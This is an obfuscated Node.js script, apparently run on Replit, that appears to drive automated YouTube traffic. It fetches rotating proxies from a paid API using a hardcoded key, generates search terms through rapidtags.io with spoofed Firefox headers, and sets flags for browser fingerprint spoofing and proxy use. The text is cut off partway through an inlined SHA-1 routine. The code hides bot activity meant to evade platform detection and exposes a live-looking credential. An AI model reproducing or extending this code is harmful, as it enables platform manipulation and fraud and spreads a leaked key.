const az = b,
  ay = c,
  ax = d;

function getRandomInt(f, g) {
  const h = ceil(f);
  return floor(random() * (floor(g) - h + (-0x2 * 0x830 + 0xd2b * -0x1 + 0x1 * 0x1d8c))) + h;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x1 * 0x1a95 + 0x18f1 * -0x1 + -0x1a4);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function randomWait() {
  return await wait(-0x125 * 0x17 + 0x104e + 0x1d8d + (0x9 * 0x281 + 0x1e47 + 0x238 * -0xf) * random()), -0x1188 + 0x999 + -0x1fc * -0x4;
}

function randomFlush(f, g) {
  const h = f['length'];
  let i = floor(random() * h),
    j = arrs['get'](g);
  for (j || (j = new Set(), arrs['set'](g, j)); j['has'](i);)
    i = floor(random() * h);
  return j['add'](i), j['size'] === h && j['clear'](), f[i];
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x1 * 0x1a95 + 0x18f1 * -0x1 + -0x1a4);
    let h = e[f];
    if (b['JsYxbA'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x1a9a + 0x8f * 0x15 + -0x8d * -0x1b, s, t, u = -0x158b + -0x24e6 + 0x3a71; t = n['charAt'](u++); ~t && (s = r % (-0xd2b + 0xdb * 0x16 + 0x1 * -0x5a3) ? s * (-0x125 * 0x17 + 0x104e + 0xa45) + t : t, r++ % (0x9 * 0x281 + 0x1e47 + 0x1b4 * -0x1f)) ? p += String['fromCharCode'](-0x1188 + 0x999 + -0x2fa * -0x3 & s >> (-(0x738 * 0x3 + 0x202d + 0x11f1 * -0x3) * r & -0xa * 0x301 + 0x1 * 0xe + -0x17 * -0x14e)) : 0x1b08 + -0xf * -0xdf + 0x805 * -0x5) {
          t = o['indexOf'](t);
        }
        for (let v = 0x1 * 0x3e3 + -0x4f * 0x1a + -0x423 * -0x1, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x12fd + -0x3d0 + -0x49 * 0x35))['slice'](-(-0x1 * 0x557 + -0x2392 + 0x28eb));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x18e5 * -0x1 + -0x2 * -0x84f + 0x2983 * -0x1,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0xb7 * 0xb + 0x16c6 + -0xee9 * 0x1; u < 0x1b16 + 0xc62 + -0x2 * 0x133c; u++) {
          p[u] = u;
        }
        for (u = 0xe7 * -0x5 + 0x14c2 * -0x1 + -0x1945 * -0x1; u < -0x7c * 0x10 + -0x4 * -0x528 + -0xbe0; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x38 * -0x2b + 0x181 * 0x5 + -0xfed), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x1627 + -0x3ef * 0x2 + 0xe49 * -0x1, q = 0x203 * -0xa + -0xb8 + 0x14d6;
        for (let v = -0xaee * 0x2 + -0x2257 + -0x1 * -0x3833; v < n['length']; v++) {
          u = (u + (0xb60 + -0x1 * -0x9ff + 0x2 * -0xaaf)) % (-0x1034 + -0x1 * -0x1a3b + -0x907), q = (q + p[u]) % (0x86 * -0x1f + 0x213 + -0x50d * -0x3), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x2241 + 0x281 + -0x11e1 * 0x2)]);
        }
        return t;
      };
      b['ACrggy'] = m, c = arguments, b['JsYxbA'] = !![];
    }
    const j = e[0x132e * -0x2 + -0x1854 + 0x7d6 * 0x8],
      k = f + j,
      l = c[k];
    return !l ? (b['YMGKdb'] === undefined && (b['YMGKdb'] = !![]), h = b['ACrggy'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}

function extractLinks(f) {
  const g = /<a\s+(?:[^>]*?\s+)?href="([^"]*)"/gi;
  let h, i = [];
  for (; null !== (h = g['exec'](f));)
    h['index'] === g['lastIndex'] && g['lastIndex']++, h['forEach']((j, k) => {
      0x738 * 0x3 + 0x202d + 0x2b1 * -0x14 === k && i['push'](j);
    });
  return i;
}

function extractAnchorData(f) {
  const g = h => {
    const i = f['indexOf'](h + '=\x22');
    if (-(-0xa * 0x301 + 0x1 * 0xe + -0x3 * -0x9ff) === i)
      return null;
    const j = i + h['length'] + (0x1b08 + -0xf * -0xdf + 0x137 * -0x21),
      k = f['indexOf']('\x22', j);
    return -(0x1 * 0x3e3 + -0x4f * 0x1a + -0x424 * -0x1) === k ? null : f['substring'](j, k);
  };
  return {
    'pingUrl': g('data-ping-' + 'url'),
    'scriptId': g('data-scrip' + 't-id'),
    'ipAddress': g('data-ip-ad' + 'dress'),
    'pingKey': g('data-ping-' + 'key')
  };
}
async function getSearchTerm() {
  const aw = c;
  return [
    ...(await fetch('https://ra' + 'pidtags.io' + '/api/gener' + 'ator?query' + '=' + _theAlphabet[aw(0x1f)]() + ('&type=YouT' + 'ube'), {
      'credentials': 'omit',
      'headers': {
        'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '09.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '16.0',
        'Accept': 'applicatio' + 'n/json',
        'Accept-Language': 'en-US,en;q' + '=0.5',
        'Prefer': 'safe',
        'Alt-Used': 'rapidtags.' + 'io',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origi' + 'n'
      },
      'referrer': 'https://ra' + 'pidtags.io' + '/generator',
      'method': 'GET',
      'mode': 'cors'
    })['then'](f => f['json']()))['tags'],
    'zyenith',
    'zyenith\x20mi' + 'necraft',
    'minecraft\x20' + 'zyenith',
    'moomoo.io',
    'moomoo.io\x20' + 'spyder',
    'mrbeast',
    'pewdiepie',
    'quadeca',
    'urban\x20resc' + 'ue\x20ranch'
  ]['random']();
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x1 * 0x1a95 + 0x18f1 * -0x1 + -0x1a4);
    let h = e[f];
    if (c['dqaFxd'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x1a9a + 0x8f * 0x15 + -0x8d * -0x1b, r, s, t = -0x158b + -0x24e6 + 0x3a71; s = m['charAt'](t++); ~s && (r = q % (-0xd2b + 0xdb * 0x16 + 0x1 * -0x5a3) ? r * (-0x125 * 0x17 + 0x104e + 0xa45) + s : s, q++ % (0x9 * 0x281 + 0x1e47 + 0x1b4 * -0x1f)) ? o += String['fromCharCode'](-0x1188 + 0x999 + -0x2fa * -0x3 & r >> (-(0x738 * 0x3 + 0x202d + 0x11f1 * -0x3) * q & -0xa * 0x301 + 0x1 * 0xe + -0x17 * -0x14e)) : 0x1b08 + -0xf * -0xdf + 0x805 * -0x5) {
          s = n['indexOf'](s);
        }
        for (let u = 0x1 * 0x3e3 + -0x4f * 0x1a + -0x423 * -0x1, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x12fd + -0x3d0 + -0x49 * 0x35))['slice'](-(-0x1 * 0x557 + -0x2392 + 0x28eb));
        }
        return decodeURIComponent(p);
      };
      c['NgYuGD'] = i, b = arguments, c['dqaFxd'] = !![];
    }
    const j = e[-0x18e5 * -0x1 + -0x2 * -0x84f + 0x2983 * -0x1],
      k = f + j,
      l = b[k];
    return !l ? (h = c['NgYuGD'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function isValidProxy(f) {
  return 'string' == typeof f && f['length'] > 0x12fd + -0x3d0 + -0x50e * 0x3 && f['includes'](':');
}
async function getRandomProxy() {
  for (;;) {
    const f = await fetch('https://st' + 'ratums.io/' + 'api/proxy/' + 'fetch?amt=' + '1&premium=' + 'yes&key=68' + 'dd383d6a62' + 'fb45684a02' + '1121959d15' + '06f8270066' + 'c62adc84aa' + 'a256e2b0e2' + '09')['then'](g => g['text']());
    if (isValidProxy(f))
      return f;
  }
}
const replUrl = 'https://' + process['env']['REPL_SLUG'] + '.' + process['env']['REPL_OWNER'] + '.repl.co',
  flags = {
    'ActivateBrowser': 0x1,
    'RPL2_MDM2': 0x1,
    'RPL2_RPRT': 0x1,
    'RPL2_YT': 0x1,
    'doOUJS': 0x1,
    'doGF': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1,
    'doUseProxy': 0x1
  },
  sha1 = ((() => {
    var f, g, h, i, j, k, l, m, n = 'object' == typeof window ? window : {},
      o = !n['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
    o && (n = global), f = ('0123456789' + 'abcdef')['split'](''), g = [-(-0x110 * 0x20f0dd + -0xe917ec14 + 0x18c17d6e4), -0xba741 * -0xe + -0xa * -0xae3fd + 0x4806b8 * -0x2, -0x112d * 0x3 + 0x953e + -0x1e49 * -0x1,
      0x1b16 + 0xc62 + -0x8 * 0x4df
    ], h = [
      0xe7 * -0x5 + 0x14c2 * -0x1 + -0x97 * -0x2b, -0x7c * 0x10 + -0x4 * -0x528 + -0xcd0, -0x38 * -0x2b + 0x181 * 0x5 + -0x10e5,
      0x1627 + -0x3ef * 0x2 + 0xe49 * -0x1
    ], i = [
      'hex',
      'array',
      'digest',
      'arrayBuffe' + 'r'
    ], j = [], k = function(r) {
      return function(s) {
        return new p(0x203 * -0xa + -0xb8 + 0x14d7)['update'](s)[r]();
      };
    }, l = function() {
      var r, s, u = k('hex');
      for (o && (u = m(u)), u['create'] = function() {
          return new p();
        }, u['update'] = function(v) {
          return u['create']()['update'](v);
        }, r = -0xaee * 0x2 + -0x2257 + -0x1 * -0x3833; r < i['length']; ++r)
        s = i[r], u[s] = k(s);
      return u;
    }, m = function(r) {
      var s = eval('require(\'crypto\');'),
        t = eval('require(\'buffer\')[\'Buffer\'];'),
        u = function(v) {
          if ('string' == typeof v)
            return s['createHash']('sha1')['update'](v, 'utf8')['digest']('hex');
          if (v['constructo' + 'r'] === ArrayBuffer)
            v = new Uint8Array(v);
          else {
            if (void(0xb60 + -0x1 * -0x9ff + 0x1 * -0x155f) === v['length'])
              return r(v);
          }
          return s['createHash']('sha1')['update'](new t(v))['digest']('hex');
        };
      return u;
    };
    class p {
      constructor(r) {
          r ? (j[-0x1034 + -0x1 * -0x1a3b + -0xa07] = j[0x86 * -0x1f + 0x213 + -0x4bd * -0x3] = j[0x2241 + 0x281 + -0x24c1 * 0x1] = j[0x132e * -0x2 + -0x1854 + 0xa73 * 0x6] = j[-0x245 * -0xe + -0x2033 + -0x38 * -0x2] = j[0x1dd0 + -0x23d8 + -0x1 * -0x60c] = j[0x6 * -0x5bf + 0x25 * -0x59 + -0xbd7 * -0x4] = j[0x1960 + -0x26a9 + 0xd4f] = j[0x1e26 + -0x169f + 0x1 * -0x780] = j[0x1c9 * 0xb + 0x867 + -0x1c02] = j[0x106f + -0xd * 0x2c9 + -0xb * -0x1cd] = j[0x1 * -0x1ad2 + -0x71d + 0x21f9] = j[-0x2480 + -0x5f * -0x64 + -0x91] = j[-0x256a + 0x1d * 0xc4 + 0xf42] = j[-0xdce + 0xb1c + 0x2bf] = j[-0x9 * 0x12e + -0x3 * -0xb77 + 0x17b9 * -0x1] = j[-0x2299 + 0x8be + 0x19ea] = 0x1 * 0x18e5 + -0x184e + 0x97 * -0x1, this['blocks'] = j) : this['blocks'] = [-0x17f1 * -0x1 + -0xb95 + -0xc5c,
            0x17d1 + 0x32 * -0xc2 + 0xe13,
            0x183d * 0x1 + 0x22e + -0x1a6b * 0x1,
            0xb * -0x223 + 0x73f * -0x1 + 0x1ec0, -0x12f9 + -0x83e * -0x1 + 0xabb,
            0x1 * -0x106c + 0x1 * 0x159d + -0x531,
            0x2 * -0x9c7 + 0xf * 0x271 + -0x1111, -0x74f * -0x4 + -0x18e6 + -0xde * 0x5,
            0x185 * -0x13 + -0xe7e + 0x2b5d,
            0x12c9 + -0x191d * 0x1 + 0x2d * 0x24,
            0x23a3 * -0x1 + 0x567 * -0x5 + -0xb * -0x5b2, -0x2323 + 0x1499 + -0x745 * -0x2,
            0x9b6 + -0x5 * -0x7b + -0xc1d, -0x242f * 0x1 + -0x251d + 0x494c,
            0x2 * -0x283 + 0x481 * 0x1 + 0x85 * 0x1,
            0x251e + -0x1 * -0x1976 + 0xa * -0x642, -0x16ad * 0x1 + -0x2 * -0x9 + 0x283 * 0x9
          ], this['h0'] = -0x1a01a37 * 0x1f + -0x11c7 * -0xa4971 + -0x1d37482d, this['h1'] = -0x164cfc056 + -0x10b2cae6d + 0x35fca1a4c * 0x1, this['h2'] = -0x7be09fa1 + -0x683b8d61 * -0x2 + 0x442461dd, this['h3'] = -0x1b2ae4d4 * -0x1 + 0x1329 * 0x7f43 + 0x147eeb19 * -0x1, this['h4'] = -0x2d26b9ea + -0x2cf6ec69 * -0x1 + 0xc402af71, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x1d * -0x53 + -0x1 * -0x228e + -0x2bf5, this['finalized'] = this['hashed'] = -0x290 + 0x3ad * 0x1 + -0x11d, this['first'] = -0x525 * -0x1 + -0x11fc + 0xcd8;
        }
        ['update'](u) {
          var v, w, x, y, z, A;
          if (!this['finalized']) {
            for ((v = 'string' != typeof u) && u['constructo' + 'r'] === n['ArrayBuffe' + 'r'] && (u = new Uint8Array(u)), x = 0xb * -0x349 + 0x1 * -0x2231 + -0x1195 * -0x4, z = u['length'] || 0x21ee + -0x269 * -0xe + -0x2 * 0x21d6, A = this['blocks']; x < z;) {
              if (this['hashed'] && (this['hashed'] = -0x1194 + -0x1146 + 0x22da, A[-0x24df + -0x6 * 0x4d1 + 0x41c5] = this['block'], A[-0x4 * 0x874 + -0x1f33 + 0x4113] = A[-0x9a + -0x6b3 * 0x2 + 0xe01] = A[0x1ba7 * 0x1 + -0x8c * 0x2 + 0x1 * -0x1a8d] = A[0xd9 * -0xb + -0xe * 0xb2 + -0x1 * -0x1312] = A[-0x6 * 0x2f + -0xd1d + 0x1 * 0xe3b] = A[0x4 * 0x773 + -0xc4 * -0x6 + -0x225f] = A[0x1d79 * 0x1 + 0x15ec + -0x335f] = A[-0x989 * 0x2 + 0x9 * 0x15d + 0x36a * 0x2] = A[0x22b0 + 0x2 * -0x162 + -0x1fe4] = A[-0x228 * 0x7 + -0x2439 + 0x3 * 0x111e] = A[-0xc * -0x313 + -0x1cc8 + 0x409 * -0x2] = A[0x163d * -0x1 + 0x1b * -0x16e + 0x3ce2] = A[-0x1 * -0x1fe1 + 0x7 * -0x89 + -0x2 * 0xe0b] = A[0x37 * -0x6b + -0xad1 * 0x1 + 0x21db] = A[0x1937 + 0x53a + -0x1e63] = A[-0x1fe3 + 0x1393 * -0x1 + 0x6d * 0x79] = 0xb4e * -0x1 + 0x784 * -0x4 + 0x295e), v) {
                for (y = this['start']; x < z && y < -0x4 * -0x51a + -0x17 * -0x47 + -0x1a89; ++x)
                  A[y >> -0x257d + -0x1bca + 0x15c3 * 0x3] |= u[x] << h[-0x13e9 + -0x3b5 + -0x17 * -0x107 & y++];
              } else {
                for (y = this['start']; x < z && y < -0x50 * 0x5 + 0x1456 + -0x943 * 0x2; ++x)
                  (w = u['charCodeAt'](x)) < 0x114f * -0x2 + 0x1 * 0x1416 + 0xf08 ? A[y >> -0x2 * -0x48e + 0x17c1 + -0x20db] |= w << h[-0x1 * 0x11f3 + 0x11cf + 0x27 & y++] : w < -0x679 + -0x3 * 0x1e5 + 0x1428 ? (A[y >> -0x1a73 + 0x1bcc + 0x7 * -0x31] |= (-0x1c27 * -0x1 + 0xf8e * -0x2 + -0xd * -0x49 | w >> 0x43 * 0x77 + 0xaf7 + -0x2a16) << h[0x19 * -0x97 + 0x16e3 + -0x821 & y++], A[y >> 0x26a6 + 0x1d2e + -0x43d2] |= (0x1fef + -0x3 * -0x779 + -0x35da | -0x10ae + -0x5ed + -0xd * -0x1c2 & w) << h[0x141f * -0x1 + 0x1fd * 0x1 + 0x1225 & y++]) : w < -0x1 * 0x15f44 + 0x18ef9 + 0xa84b || w >= 0x5 * -0x3c8b + -0x23d * -0xa2 + 0xa41d * 0x1 ? (A[y >> -0x8a8 * 0x3 + -0x227 * -0x1 + 0x17d3] |= (0x1 * 0xc74 + -0x2 * -0x1082 + -0x164c * 0x2 | w >> 0x5 * 0x5cc + -0x3 * -0x9b9 + 0xaf * -0x55) << h[-0x1d6b * -0x1 + -0xbb9 + -0x1 * 0x11af & y++], A[y >> 0x24b6 * 0x1 + -0xe1f + -0x1695] |= (-0x12 * 0x2b + 0xf03 + -0xb7d | w >> 0x263 * 0xd + 0xe85 + -0x16c3 * 0x2 & 0x1e9e + -0x8ad + 0xad9 * -0x2) << h[-0x14bc * -0x1 + 0x8 * -0xc1 + -0xeb1 & y++], A[y >> -0xfef + -0x571 * 0x7 + 0x3608] |= (-0x52 * 0xa + -0x1f4b * -0x1 + -0x1b97 | -0x1d1 + -0x56a + -0x6 * -0x13f & w) << h[0xd0c + 0x2624 + 0x1 * -0x332d & y++]) : (w = -0xe609 * -0x2 + 0x1 * 0xcc2b + -0x1983d * 0x1 + ((0x457 * -0x1 + 0x25bb + -0x1d65 & w) << -0x1 * 0x644 + -0x2372 + 0x29c0 | -0x637 * -0x3 + -0x3 * -0x32 + -0xf3c & u['charCodeAt'](++x)), A[y >> 0x3e * -0x63 + -0x2 * 0x11a5 + 0x36 * 0x119] |= (0x2681 * -0x1 + -0x439 + -0x1 * -0x2baa | w >> -0xa78 + 0x1f9b + -0x1 * 0x1511) << h[0x102f + -0xb4a + -0x4e2 & y++], A[y >> -0x16 * 0xb8 + -0x3 * -0x9a5 + -0x45f * 0x3] |= (0x1022 + 0x23e * 0x1 + -0x11e0 | w >> 0x16b8 + 0x2441 * -0x1 + 0xd95 & -0x2186 * 0x1 + -0x1d * -0x11d + -0x2 * -0xbe) << h[0x1fc * -0x5 + 0x1 * -0x23c9 + 0x2db8 & y++], A[y >> 0x242d + 0x24b7 + -0x48e2] |= (-0x11 * 0x1e7 + -0x25f7 + 0x1 * 0x46ce | w >> 0x11f1 + 0x1f53 + -0x313e & 0x19b * 0x1 + 0x1cf5 * 0x1 + 0x1 * -0x1e51) << h[-0x65 * 0x59 + 0x1781 + -0x1 * -0xb9f & y++], A[y >> -0x1 * -0xca + -0x1 * -0xbc3 + -0xd * 0xf7] |= (0x1e2 * -0x1 + -0x15f9 + 0x91 * 0x2b | -0x3 * 0x649 + -0xd2a + 0x2044 & w) << h[0x1 * -0xa2a + -0x1 * 0x28d + 0x16a * 0x9 & y++]);
              }
              this['lastByteIn' + 'dex'] = y, this['bytes'] += y - this['start'], y >= 0x5 * 0x6c6 + -0x3 * 0x6db + -0xd0d * 0x1 ? (this['block'] = A[-0x2401 + 0x1 * 0x1580 + 0xb * 0x153], this['start'] = y - (-0x474 * -0x7 + 0x1df3 + -0x3cdf), this['hash'](), this['hashed'] = -0x5b3 + -0x407 * 0x1 + 0x1 * 0x9bb) : this['start'] = y;
            }
            return this['bytes'] > -0x48 * -0x1a2b937 + 0xe184bec7 + 0x15d23590 * -0x4 && (this['hBytes'] += this['bytes'] / (0x311702 * -0x652 + -0xd65bbacc + 0x30c9f2570 * 0x1) << 0xb49 + -0x1 * 0x463 + 0x1 * -0x6e6, this['bytes'] = this['bytes'] % (0x11cc97e2c + -0x11c7a5cc8 + 0xffb0de9c)), this;
          }
        }
        ['finalize']() {
          if (!this['finalized']) {
            this['finalized'] = 0x11 * -0x1f + 0x1 * 0x16a9 + -0x1499;
            var r = this['blocks'],
              s = this['lastByteIn' + 'dex'];
            r[0x2043 + 0xe01 + -0x2e34] = this['block'], r[s >> -0x21b * 0x3 + -0x1 * 0x18e5 + -0xa68 * -0x3] |= g[-0x1d5c + 0xc25 + 0x113a & s], this['block'] = r[0x116f * -0x1 + 0x739 + 0xa46], s >= -0x1211 + 0x77b * -0x1 + 0x19c4 * 0x1 && (this['hashed'] || this['hash'](), r[0x1 * -0x207b + 0x1 * -0x1ea9 + 0x3f24] = this['block'], r[0xda3 * -0x1 + 0x186d + -0x55d * 0x2] = r[-0x1463 + -0x1 * 0x1eca + 0x332e] = r[0x2625 + 0x8dd + -0x2f00] = r[0x9 * -0x1c4 + -0x56 * -0x12 + 0x9db] = r[0x23a9 + -0x1 * 0x1c41 + 0x2c * -0x2b] = r[0x13f0 + -0x1e * 0x36 + -0xd97] = r[0x2096 + -0x5c1 + 0x1 * -0x1acf] = r[0x189 + -0x4c5 + 0x1 * 0x343] = r[-0xdf * -0x1 + 0x1107 * -0x1 + -0x103 * -0x10] = r[0x1f56 + 0x5 * 0x37f + 0x2 * -0x1864] = r[0x3be + 0xd17 * -0x1 + 0x963 * 0x1] = r[0x11 * -0xe9 + -0x1 * 0x22e2 + 0x3266] = r[-0x13 * 0x14e + -0x529 + 0x449 * 0x7] = r[0x19b * -0xe + 0x834 + -0xe53 * -0x1] = r[0x2618 + 0x1667 * -0x1 + -0x1 * 0xfa3] = r[-0xadc + 0x6b9 * -0x4 + -0x1 * -0x25cf] = 0x146f + 0x35 * 0xb5 + -0x39e8), r[-0x1 * 0x17b0 + 0x26e0 + -0xf22] = this['hBytes'] << -0x8a1 + 0xc7a + -0x3d6 | this['bytes'] >>> 0x1c83 + 0x2559 + -0x41bf, r[-0x1528 + -0x234d + 0x3884] = this['bytes'] << 0x2208 + 0x1105 * -0x2 + 0x1 * 0x5, this['hash']();
          }
        }
        ['hash']() {
          var u, v, w = this['h0'],
            x = this['h1'],
            y = this['h2'],
            z = this['h3'],
            A = this['h4'],
            B = this['blocks'];
          for (u = -0x1 * 0x226d + 0x18cd * -0x1 + 0x3b4a * 0x1; u < 0x1a65 * 0x1 + -0x2678 + 0x97 * 0x15; ++u)
            v = B[u - (-0x35 * 0xb9 + -0x60c * -0x4 + 0xe20)] ^ B[u - (0x1 * 0x503 + -0xb5e + 0x663)] ^ B[u - (0x1b9a + -0x701 * -0x3 + 0x1f * -0x191)] ^ B[u - (0x4 * 0x337 + -0x1d3e + 0x1072)], B[u] = v << -0x1edb + 0x2a * -0xd6 + -0x20fc * -0x2 | v >>> -0x1a96 * -0x1 + -0x1ac7 + 0x50;
          for (u = -0x4d9 * -0x8 + -0x29 * 0xcf + -0x5a1; u < 0x1f4b + -0xe57 * -0x1 + -0x2d8e; u += 0x105e * 0x2 + -0x293 * -0xc + -0x3f9b)
            w = (v = (x = (v = (y = (v = (z = (v = (A = (v = w << 0x1 * -0x26c4 + 0x17ef + 0xeda | w >>> 0x90 + -0x141 * -0x1 + -0x1b6) + (x & y | ~x & z) + A + (-0x1 * 0x822df20b + 0x133 * -0x3799f + 0xe0db4551 * 0x1) + B[u] << -0x9 * -0x303 + 0x2 * -0xe2b + 0x13b * 0x1) << 0xd * -0x1c6 + 0x2301 + -0xbee | A >>> -0x1 * -0x4f + 0x1e23 + 0xa1d * -0x3) + (w & (x = x << -0x4cf * 0x1 + -0xc8f + 0x117c | x >>> 0x15 * -0xf2 + 0x158f * -0x1 + -0x17 * -0x1cd) | ~w & y) + z + (0x43325219 + -0x1 * 0x5f4084a7 + 0x7690ac27) + B[u + (-0x4 * -0x36d + -0xa7 * 0x13 + -0x14e)] << 0x2 * 0x1169 + -0xab * 0x1 + -0x2227 * 0x1) << 0x760 * -0x3 + -0x1e76 + 0x349b | z >>> -0x12f * 0x8 + 0x26ea + 0x7 * -0x431) + (A & (w = w << -0x129a + -0x14db * 0x1 + 0x2793 | w >>> -0x1df * -0xa + -0x9 * 0x15 + -0x11f7) | ~A & x) + y + (0x8aa8e295 + -0x57ecb180 + 0x27c64884) + B[u + (-0xfcf + 0x51 * 0x9 + 0xcf8)] << 0x11f + 0x291 + -0x3b0) << -0x2657 + -0x6a3 + 0x2cff | y >>> 0x21ba * -0x1 + -0xc24 + -0x2df9 * -0x1) + (z & (A = A << 0x31b * 0xb + 0x630 + 0xd69 * -0x3 | A >>> -0x1af4 + -0x1 * 0x96d + 0x2463) | ~z & w) + x + (0x2 * -0x7ea6a11 + -0x11 * -0x20858ea + 0x47c96631) + B[u + (0x17c + 0x8 * 0x170 + -0xcf9)] << -0xa82 + 0x2220 + 0xbcf * -0x2) << -0x136 * 0x16 + 0x9 * 0xb3 + -0x16 * -0xed | x >>> -0x4 * 0x698 + 0x880 + 0x11fb) + (y & (z = z << 0x1ab * -0x11 + -0x883 * -0x4 + -0x593 | z >>> -0x10d * -0x15 + -0x1e76 + -0xef * -0x9) | ~y & A) + w + (0x1 * 0x41f267f + -0x7d1d82e6 + -0x69c06b0 * -0x20) + B[u + (0xa94 * -0x2 + 0x1b55 * 0x1 + -0x13 * 0x53)] << 0x2d + 0x323 * 0x4 + 0xcb9 * -0x1, y = y << -0x25 * 0x42 + 0xcdb + -0x333 | y >>> -0xe17 + -0x2 * 0xda8 + 0x2969 * 0x1;
          for (; u < -0x8b4 + -0xed5 * -0x1 + 0x8b * -0xb; u += -0x68f + -0x23 + 0x6b7)
            w = (v = (x = (v = (y = (v = (z = (v = (A = (v = w << -0x8d2 + -0x1dfe + 0x1 * 0x26d5 | w >>> -0x2 * -0xcb4 + -0x17 * -0x15a + 0x3863 * -0x1) + (x ^ y ^ z) + A + (0x1ea8be04 + -0x2d * -0x3cbb2bf + 0x2 * -0x2d4e9efb) + B[u] << 0x17d * -0xb + -0x3f5 * 0x1 + 0x1454) << 0xfe5 + -0x1f09 + -0x1 * -0xf29 | A >>> -0x11 * -0xe9 + 0x5 * 0x119 + -0x14db) + (w ^ (x = x << 0x9 * 0x2b0 + -0x55 * 0x2f + -0x877 | x >>> -0x17e8 + -0x14bf + -0xee3 * -0x3) ^ y) + z + (-0x4 * 0x1d68f7b8 + 0x133d5526 * -0x4 + 0x131731f19) + B[u + (0x1f77 * -0x1 + -0x150e * -0x1 + -0x56 * -0x1f)] << -0x1ef2 + 0x59f * 0x4 + 0x876) << 0x330 + -0x2 * 0x1202 + 0xaf3 * 0x3 | z >>> 0xa1 * -0x9 + 0x11e * 0x7 + -0x20e) + (A ^ (w = w << 0x1307 * -0x2 + -0x34d * -0x2 + 0x3 * 0xa86 | w >>> 0x4be + 0x1d * -0xd1 + 0x12f1) ^ x) + y + (-0xaa85a505 * -0x1 + 0x35bcf237 + -0x1 * 0x7168ab9b) + B[u + (-0x6a4 + 0xa9 * 0x14 + 0x347 * -0x2)] << -0xa9a + 0xd9 * -0x4 + -0x1 * -0xdfe) << -0x2452 + -0x211d + 0x4f6 * 0xe | y >>> -0x1167 + 0x1ea1 + 0x1 * -0xd1f) + (z ^ (A = A << 0x1c02 + 0x206a + -0x3c4e | A >>> 0x74f + -0x13da + -0x1b * -0x77) ^ w) + x + (0x1f5200 * -0x6a1 + -0xe8235 * -0x23d + 0x11dff0d00) + B[u + (-0x17 * -0xa3 + 0xb3a + -0x19dc)] << 0x13fa + -0x1e3b * -0x1 + 0x3235 * -0x1) << 0x229 * -0x2 + 0x10fd + -0xca6 | x >>> 0x7 * -0xb7 + 0x828 + -0x82 * 0x6) + (y ^ (z = z << 0x649 + 0x10c9 + 0x1a * -0xe2 | z >>> -0x1949 + 0x1432 + -0x5 * -0x105) ^ A) + w + (0x988a8660 + -0x28ec1b7 * 0x25 + -0xd3c592d * -0x4) + B[u + (-0x1a * -0xd + 0x1d * 0xad + -0x14e7)] << 0x7df + -0x9f * 0x35 + 0x190c, y = y << 0x1 * -0xe51 + 0x47 * -0xd + 0x905 * 0x2 | y >>> -0x1a3a + -0x412 * -0x5 + 0x5e2;
          for (; u < -0x137e + 0x7 * 0x412 + 0x2ec * -0x3; u += -0xaf1 * 0x2 + 0x1c4 + 0x1 * 0x1423)
            w = (v = (x = (v = (y = (v = (z = (v = (A = (v = w << 0x1d03 + -0x6 * 0x2a5 + 0x348 * -0x4 | w >>> -0x1df4 + 0x10c5 + -0x3f * -0x36) + (x & y | x & z | y & z) + A - (0xa7ff7c30 + 0x4fe08fc8 + -0x86fbc8d4) + B[u] << -0x3bf * 0x1 + -0x1d * 0x97 + 0x14da) << 0x1 * -0x17b3 + 0x20a1 + -0x8e9 | A >>> 0x9 * 0x1fb + 0x1807 + -0x29bf * 0x1) + (w & (x = x << -0xc2e * -0x2 + 0x24f7 + -0x1467 * 0x3 | x >>> -0x1 * -0x125b + -0x3d * -0x71 + -0x2d46) | w & y | x & y) + z - (-0x91d1025b + -0xa * -0x20af67 + 0x1016e6b79) + B[u + (-0x2391 + -0x704 + -0x9e * -0x45)] << -0x9 * 0x6a + 0x1968 + 0x73a * -0x3) << 0x192b + 0x1364 * 0x1 + -0x2c8a * 0x1 | z >>> 0x172e + -0x2 * 0x3d0 + -0xf73) + (A & (w = w << 0x2124 + -0x1b32 + -0x5d4 | w >>> -0x18da + 0x2 * -0x72f + -0x2 * -0x139d) | A & x | w & x) + y - (-0xd2cf * -0x9e3b + 0x42807 * 0x35f + -0x1f6b042a) + B[u + (-0x1 * -0x7a7 + 0x183c + -0x1 * 0x1fe1)] << 0x2212 + 0x25d4 + -0x47e6 * 0x1) << -0x247b + -0x119f * -0x2 + 0x142 | y >>> -0xca6 + -0x64b * -0x1 + 0x676) + (z & (A = A << 0xca2 * 0x3 + 0x577 * -0x1 + -0x2051 * 0x1 | A >>> 0x17ce + 0xe7e + -0xa9 * 0x3a) | z & w | A & w) + x - (0x6f428934 + 0x12f2dfaf + -0x115125bf) + B[u + (-0x109e + 0x8e4 * 0x4 + -0x1 * 0x12ef)] << -0x372 * 0x2 + 0xd0b + -0x1 * 